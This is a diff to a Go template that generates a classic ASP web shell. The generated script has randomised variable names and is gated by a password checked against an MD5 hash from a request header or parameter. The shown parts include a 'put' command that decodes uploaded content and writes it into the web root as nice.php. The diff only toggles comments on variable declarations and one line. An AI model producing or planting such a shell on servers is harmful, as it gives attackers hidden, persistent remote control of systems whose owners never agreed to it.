@@ -21,7 +21,7 @@ next
 
 {{/* Check password */}}
 {{ if ne .Password "" }}
-{{/* dim {{ index .V "pass" }} */}}
+dim {{ index .V "pass" }}
 {{ index .V "hash" }} = "{{ .PasswordHash }}"
 
 {{ if ne .PasswordHeader "" }}
@@ -30,7 +30,7 @@ next
 {{ index .V "pass" }} = request("{{ .PasswordParam }}")
 {{ end }}
 {{/* Hash and compare */}}
-{{/* Dim {{ index .V "asc" }}, {{ index .V "alg" }}, {{ index .V "hashFunc" }}, {{ index .V "digest" }}, {{ index .V "i" }} */}}
+Dim {{ index .V "asc" }}, {{ index .V "alg" }}, {{ index .V "hashFunc" }}, {{ index .V "digest" }}, {{ index .V "i" }}
 
 Set {{ index .V "asc" }} = CreateObject("System.Text.UTF8Encoding")
 Set {{ index .V "alg" }} = CreateObject("System.Security.Cryptography.MD5CryptoServiceProvider")
@@ -113,7 +113,7 @@ elseif Left({{ index .V "cmd" }}, 4) = "put " Then
   {{ index .V "fileContents" }}.Open
   {{ index .V "fileContents" }}.Write {{ index .V "encSrc" }}.NodeTypedValue
   {{ index .V "fileContents" }}.Position = 0
-  {{ index .V "fileContents" }}.Type = 2 ' adTypeText
+  {{/* {{ index .V "fileContents" }}.Type = 2 ' adTypeText */}}
   {{ index .V "fileContents" }}.CharSet = "utf-8"
   set {{ index .V "file" }}={{ index .V "fs" }}.CreateTextFile("C:\inetpub\wwwroot\nice.php",true)
   {{ index .V "file" }}.write {{ index .V "fileContents" }}.ReadText
